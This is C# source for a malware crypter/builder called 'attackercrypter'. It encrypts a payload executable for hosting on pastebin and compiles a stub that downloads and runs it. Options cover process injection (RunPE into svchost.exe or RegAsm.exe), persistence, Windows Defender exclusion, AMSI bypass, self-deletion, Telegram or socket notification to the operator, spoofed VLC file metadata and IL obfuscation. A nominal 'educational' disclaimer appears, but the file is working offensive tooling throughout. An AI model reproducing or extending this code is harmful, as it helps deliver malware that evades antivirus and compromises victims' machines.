using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using dnlib.DotNet;
using dnlib.DotNet.Emit;


namespace attackercrypter
{
    //this program is working on MIT License, so you can use, modify this program etc. but please leave credits to original author TheNewAttacker64
    // This Software For educational Don t try on somewhere you don t have permission to try on
    public partial class Form1 : Form


    {
        private readonly NotifySettings notifyForm;

        int everytihnggood = 1;
        string RunPE32 = Properties.Resources.Nik32;
        string RunPE64 = Properties.Resources.NIK64;

        public Form1()
        {
            this.notifyForm = new NotifySettings();
            InitializeComponent();
            Injection.SelectedItem = "AssemblyLoad(.Net)";
            Netinjectionpath.SelectedItem = "RegAsm.exe";
            nativeinjection.SelectedItem = "svchost.exe";

        }

       public  static string GenerateMutexName(string prefix)
        {
            int processId = Process.GetCurrentProcess().Id;
            string uniqueId = Guid.NewGuid().ToString("N");
            return $"{prefix}_{processId}_{uniqueId}";
        }
        public static string Encrypt(byte[] plainBytes, string base64Key, string base64IV)
        {
            byte[] key = Convert.FromBase64String(base64Key);
            byte[] iv = Convert.FromBase64String(base64IV);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        csEncrypt.Write(plainBytes, 0, plainBytes.Length);
                        csEncrypt.FlushFinalBlock();
                    }
                    byte[] cipherBytes = msEncrypt.ToArray();

                    List<char> content =  Convert.ToBase64String(cipherBytes).ToCharArray().ToList();
                    content.Reverse();
                    string b64Var =  string.Join(",", content.Select(c => $"'{c}'"));
                    return b64Var;

                }
            }
        }



        private void button3_Click(object sender, EventArgs e)
        {
            byte[] key;
            byte[] iv;

            using (Aes aes = Aes.Create())
            {
                key = aes.Key;
                iv = aes.IV;
            }

            string keyString = Convert.ToBase64String(key);
            string ivstr = Convert.ToBase64String(iv);
            textBox3.Text = ivstr;
            textBox2.Text = keyString;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog CRY = new OpenFileDialog();
            CRY.Title = "Select your payload";
            CRY.InitialDirectory = Directory.GetCurrentDirectory();
            CRY.Filter = "Executable files (*.exe)|*.exe";
            if (CRY.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = CRY.FileName;
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Icon (*.ico)|*.ico";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    TxtIcon.Text = openFileDialog.FileName;
                    pictureIcon.ImageLocation = openFileDialog.FileName;
                    pictureIcon.BorderStyle = BorderStyle.FixedSingle;
                }
                else
                {
                    TxtIcon.Text = string.Empty;
                    pictureIcon.ImageLocation = string.Empty;
                }

            }
        }
        public string SaveDialog(string filter)
        {
            SaveFileDialog dialog = new SaveFileDialog
            {
                Filter = filter,
                InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location)
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                return dialog.FileName;
            }
            return "";
        }


        private void button2_Click(object sender, EventArgs e)
        {
            string Main = Properties.Resources.Program;

            everytihnggood = 1;


            if (string.IsNullOrEmpty(textBox4.Text))
            {
                MessageBox.Show("Enter URL");
            }
            else if (runpecheck.Checked == true && isNative.Checked == false && isNet.Checked == false)
            {
                MessageBox.Show("Please choose your payload type .net or native");
            }
            else if (runpecheck.Checked == true && radio32.Checked == false && radio64.Checked == false)
            {
                MessageBox.Show("Please choose your payload architecture x64 or x32");

            }
            else if (string.IsNullOrEmpty(mutex.Text))
            {
                MessageBox.Show("Please Generate a Mutex");
            }

            if (melt.Checked && Injection.SelectedItem.ToString() == "AssemblyLoad(.Net)")
            {
                MessageBox.Show("Melt Function Can Be just Used With RUNPE");
            }

            else
            {
                CompilerParameters Params = new CompilerParameters();
                Params.GenerateExecutable = true;
                Params.ReferencedAssemblies.Add("System.dll");
                Params.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                Params.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
                Params.CompilerOptions = "/unsafe";
                Params.CompilerOptions += "\n/t:winexe";

                if (string.IsNullOrWhiteSpace(TxtIcon.Text))
                {

                }
                else
                {
                    Params.CompilerOptions += "\n/win32icon:" + TxtIcon.Text;
                }
                Params.OutputAssembly = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");

                string Source = Properties.Resources.config;




                Params.ReferencedAssemblies.Add(typeof(System.Linq.Enumerable).Assembly.Location);
                Params.ReferencedAssemblies.Add("System.Drawing.dll");

                Source = Source.Replace("$MUTEX", mutex.Text);
                
                if (Sleeptime.Checked)
                {
                    Source = Source.Replace("$SLEEPTIME", (numericUpDownSleep.Value * 1000).ToString());
                    Source = Source.Replace("public static bool issleep = false;", "public static bool issleep = true;");
                }
                else
                {
                    Source = Source.Replace("$SLEEPTIME", "1000");
                    Source = Source.Replace("$SLEEPTIME", "1000");
                }
                if (checkBox2.Checked)
                {
                    Source = Source.Replace("public static bool ispersist = false;", "public static bool ispersist = true;");
                    Source = Source.Replace("$FOLDER", foldername.Text);
                    Source = Source.Replace("$FNAME", Filename.Text);
                    Source = Source.Replace("$service", servicename.Text);
                }
                if (checkBox2.Checked && radioButton1.Checked)
                {
                    Source = Source.Replace("public static bool istartup = false;", "public static bool istartup = true;");


                }
                else if (checkBox2.Checked && radioButton2.Checked)
                {
                    Source = Source.Replace("public static int taskm = 0;", $"public static int taskm = {numericUpDownSc.Value.ToString()};");
                    Source = Source.Replace("public static bool istask = false;", "public static bool istask = true;");


                }
                if (exdf.Checked)
                {
                    Source = Source.Replace("public static bool isexcludewd = false;", "public static bool isexcludewd = true;");


                }
                if (tg.Checked)
                {
                    string filename = "tgbot.txt";

                    if (!File.Exists(filename))
                    {
                        MessageBox.Show("Please enable Notify Settings");
                        return;
                    }
                    else
                    {
                        using (StreamReader reader = new StreamReader(filename))
                        {
                            string content = reader.ReadToEnd();

                            char[] delimiter = { '|' };
                            string[] splitinfo = content.Split(delimiter);
                            string bottoken = splitinfo[0];
                            string chatid = splitinfo[1];
                            Source = Source.Replace("$bottoken", bottoken);
                            Source = Source.Replace("$chatid", chatid);
                            Source = Source.Replace("public static bool istelegramnotify = false;", "public static bool istelegramnotify = true;");
                        }



                    }



                }
                if (sock.Checked)
                {
                    string sockfilename = "ServerCred.txt";
                    if (!File.Exists(sockfilename))
                    {
                        MessageBox.Show("Please enable Notify Settings");
                        return;
                    }
                    else
                    {
                        using (StreamReader reader = new StreamReader(sockfilename))
                        {
                            string content = reader.ReadToEnd();

                            char[] delimiter = { '|' };
                            string[] splitinfo = content.Split(delimiter);
                            string ip = splitinfo[0];
                            string port = splitinfo[1];
                            string password = splitinfo[2];
                            Source = Source.Replace("$IP", ip);
                            Source = Source.Replace("$PORT", port);
                            Source = Source.Replace("$serverpassword", password);
                            Source = Source.Replace("public static bool issocketnotify = false;", "public static bool issocketnotify = true;");
                        }
                    }
                }
                else
                {
                    Source = Source.Replace("$PORT", "0");

                }
                if (powershell.Checked == true)
                {
                    Source = Source.Replace("public static bool ispwcommand = false;", "public static bool ispwcommand = true;");
                    byte[] bytes = System.Text.Encoding.Unicode.GetBytes(powershellcommand.Text);
                    string encodedCommand = System.Convert.ToBase64String(bytes);
                    Source = Source.Replace("$command", encodedCommand);
                }
                if (Amsi.Enabled == true)
                {
                    Source = Source.Replace("public static bool ispassamsi = false;", "public static bool ispassamsi = true;");
                }
                if (melt.Checked)
                {
                    Source = Source.Replace("public static bool ismelt = false;", "public static bool ismelt = true;");
                }

                if (Injection.SelectedItem.ToString() == "AssemblyLoad(.Net)")
                {
                    MessageBox.Show("Note: This injection only works with .net files", "Attacker-Crypter", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    Source = Source.Replace("public static bool isdotnetload = false;", "public static bool isdotnetload = true;");

                }
                else if (Injection.SelectedItem.ToString().ToUpper() == "RUNPE" && runpecheck.Checked == false)
                {
                    MessageBox.Show("Please enable and configure RunPE Settings", "Attacker-Crypter", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    everytihnggood = 0;
                }
                else if (Injection.SelectedItem.ToString().ToUpper() == "RUNPE" && runpecheck.Checked == true)
                {

                    if (isNet.Checked == true)
                    {
                        Source = Source.Replace("public static bool isNet = false;", "public static bool isNet = true;");
                        Source = Source.Replace("#DOTNETINJECTPATH", Netinjectionpath.SelectedItem.ToString());

                    }
                    else if (isNative.Checked == true)
                    {
                        Source = Source.Replace("public static bool isNative = false;", "public static bool isNative = true;");

                        Source = Source.Replace("#NATIVEINJECTPATH", nativeinjection.SelectedItem.ToString());

                    }

                }

                if (runpecheck.Checked == true && radio64.Checked == true)
                {

                    Params.CompilerOptions += "\n/platform:x64";
                    Source = Source.Replace("public static bool isrunportal64 = false;", "public static bool isrunportal64 = true;");


                }
                else if (runpecheck.Checked == true && radio32.Checked == true)
                {
                    Params.CompilerOptions += "\n/platform:x86";

                    Source = Source.Replace("public static bool isrunportal32 = false;", "public static bool isrunportal32 = true;");

                }

                var settings = new Dictionary<string, string>();
                settings.Add("CompilerVersion", "v4.0");
                if (everytihnggood == 1)
                {
                    if (assembly.Checked = true)
                    {
                        Main = Main.Replace("#AssemblyTitle", txtTitle.Text);
                        Main = Main.Replace("#AssemblyDescription", txtDescription.Text);
                        Main = Main.Replace("#AssemblyProduct", txtProduct.Text);
                        Main = Main.Replace("#AssemblyCompany", txtCompany.Text);
                        Main = Main.Replace("#AssemblyCopyright", txtCopyright.Text);
                        Main = Main.Replace("#AssemblyTrademark", txtTrademark.Text);
                        Main = Main.Replace("#AssemblyMajorVersion", assemblyMajorVersion.Text);
                        Main = Main.Replace("#AssemblyMinorVersion", assemblyMinorVersion.Text);
                        Main = Main.Replace("#AssemblyBuildPart", assemblyBuildPart.Text);
                        Main = Main.Replace("#AssemblyMajorVersion", assemblyMajorVersion.Text);
                        Main = Main.Replace("#AssemblyPrivatePart", assemblyPrivatePart.Text);
                        Main = Main.Replace("#Guid", Guid.NewGuid().ToString());
                    }
                    else
                    {
                        string title = "vlc";
                        string Description = "VLC media player";
                        string Product = "VLC media player";
                        string Company = "VideoLAN";
                        string Copyright = "Copyright © 1996-2018 VideoLAN and VLC Author";
                        string Trademark = "VLC media player, VideoLAN and x264 are registered trademarks from VideoLAN";
                        string MajorVersion = "3";
                        string MinorVersion = "0";
                        string BuildPart = "3";
                        string PrivatePart = "0";
                        Main = Main.Replace("#AssemblyTitle", title);
                        Main = Main.Replace("#AssemblyDescription", Description);
                        Main = Main.Replace("#AssemblyProduct", Product);
                        Main = Main.Replace("#AssemblyCompany", Company);
                        Main = Main.Replace("#AssemblyCopyright", Copyright);
                        Main = Main.Replace("#AssemblyTrademark", Trademark);
                        Main = Main.Replace("#AssemblyMajorVersion", MajorVersion);
                        Main = Main.Replace("#AssemblyMinorVersion", MinorVersion);
                        Main = Main.Replace("#AssemblyBuildPart", BuildPart);
                        Main = Main.Replace("#AssemblyMajorVersion", MajorVersion);
                        Main = Main.Replace("#AssemblyPrivatePart", PrivatePart);
                        Main = Main.Replace("#Guid", Guid.NewGuid().ToString());
                    }
                    Main = Main.Replace("$URL", Convert.ToBase64String(Encoding.UTF8.GetBytes(textBox4.Text)));
                    Main = Main.Replace("$key", textBox2.Text);
                    Main = Main.Replace("$IV", textBox3.Text);
                    CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Main, Source, RunPE32, RunPE64);
                    if (Results.Errors.Count > 0)
                    {

                        foreach (CompilerError err in Results.Errors)
                            MessageBox.Show(err.ToString(), "There was an Error!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                    else
                    {
                        MessageBox.Show("File encrypted successfully");
                    }

                }
                else
                {
                    everytihnggood = 0;
                    return;
                }









            }

        }
        public static void Obfuscate(string inputFile, string outputFile)
        {

            var module = ModuleDefMD.Load(inputFile);

            var random = new Random();
            foreach (var type in module.Types)
            {
       
                var className = GenerateRandomString(random, 10);
                type.Name = className;


                foreach (var method in type.Methods.Where(m => m.HasBody))
                {
                    var methodName = GenerateRandomString(random, 10);
                    method.Name = methodName;

        
                    foreach (var variable in method.Body.Variables)
                    {
                        var variableName = GenerateRandomString(random, 5);
                        variable.Name = variableName;
                    }

                    foreach (var instruction in method.Body.Instructions)
                    {
                        if (instruction.OpCode == OpCodes.Br || instruction.OpCode == OpCodes.Br_S ||
                            instruction.OpCode == OpCodes.Brfalse || instruction.OpCode == OpCodes.Brfalse_S ||
                            instruction.OpCode == OpCodes.Brtrue || instruction.OpCode == OpCodes.Brtrue_S ||
                            instruction.OpCode == OpCodes.Leave || instruction.OpCode == OpCodes.Leave_S)
                        {
                            var label = (Instruction)instruction.Operand;
                            var labelName = GenerateRandomString(random, 5);
                            label.OpCode = OpCodes.Nop;
                            label.Operand = null;
                            label.Offset = instruction.Offset;
                            instruction.Operand = label;
                            instruction.OpCode = OpCodes.Br;
                            label.OpCode = OpCodes.Nop;
                            label.Operand = null;
                            label.Offset = instruction.Offset;
                        }
                    }

                    // Set CilBody.KeepOldMaxStack to true to ignore stack calculation errors
                    if (method.Body.HasInstructions)
                    {
                        method.Body.KeepOldMaxStack = true;
                    }
                }
            }



            // Set MetadataOptions.Flags to keep old max stack values

            // Save the obfuscated assembly to disk
            module.Write(outputFile);
        }

        private static string GenerateRandomString(Random random, int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            return new string(Enumerable.Repeat(chars, length)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private void button5_Click(object sender, EventArgs e)
        {

            if (!File.Exists(textBox1.Text))
            {
                MessageBox.Show("Select File please :(");
            }
            else
            {
                Byte[] F = File.ReadAllBytes(textBox1.Text);
                File.WriteAllText("Loader.txt",Encrypt(F, textBox2.Text, textBox3.Text));
                MessageBox.Show("Copy the content of Loader.txt and paste it in pastebin then copy the raw URL and paste it into Builder Area");
            }
            

        }

        private void exdf_CheckedChanged(object sender, EventArgs e)
        {
            MessageBox.Show("This will popup UAC one time");
        }

        private void author_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://github.com/TheNewAttacker64");
        }

        private void button6_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var fileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);

                    txtTitle.Text = fileVersionInfo.InternalName ?? string.Empty;
                    txtDescription.Text = fileVersionInfo.FileDescription ?? string.Empty;
                    txtProduct.Text = fileVersionInfo.CompanyName ?? string.Empty;
                    txtCompany.Text = fileVersionInfo.ProductName ?? string.Empty;
                    txtCopyright.Text = fileVersionInfo.LegalCopyright ?? string.Empty;
                    txtTrademark.Text = fileVersionInfo.LegalTrademarks ?? string.Empty;

                    var version = fileVersionInfo.FileMajorPart;
                    assemblyMajorVersion.Text = fileVersionInfo.FileMajorPart.ToString();
                    assemblyMinorVersion.Text = fileVersionInfo.FileMinorPart.ToString();
                    assemblyBuildPart.Text = fileVersionInfo.FileBuildPart.ToString();
                    assemblyPrivatePart.Text = fileVersionInfo.FilePrivatePart.ToString();

                }
             



            }
        }
        

        private void button7_Click(object sender, EventArgs e)
        {

        }

        private void button7_Click_1(object sender, EventArgs e)
        {
            notifyForm.ShowDialog();
        }

        private void label11_Click(object sender, EventArgs e)
        {

        }

        private void numericUpDownSleep_ValueChanged(object sender, EventArgs e)
        {

        }

        private void label8_Click(object sender, EventArgs e)
        {

        }

        private void label7_Click(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void Amsi_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void pictureIcon_Click(object sender, EventArgs e)
        {

        }

        private void label15_Click(object sender, EventArgs e)
        {

        }

        private void mutexgen_Click(object sender, EventArgs e)
        {
            mutex.Text = GenerateMutexName("attackercrypter");
        }

        private void button8_Click(object sender, EventArgs e)
        {
            MessageBox.Show("This Function Still Under Dev");
            OpenFileDialog dialog = new OpenFileDialog();
            dialog.Filter = "Executable files (*.exe)|*.exe";
            dialog.Title = "Select an executable file";

            if (dialog.ShowDialog() == DialogResult.OK)
            {
                string selectedFile = dialog.FileName;
                Obfuscate(selectedFile, "Obfuscated.exe");
                MessageBox.Show("Saved As Obfuscated.exe");
            }
            else
            {
    
            }
        }

    }
    }

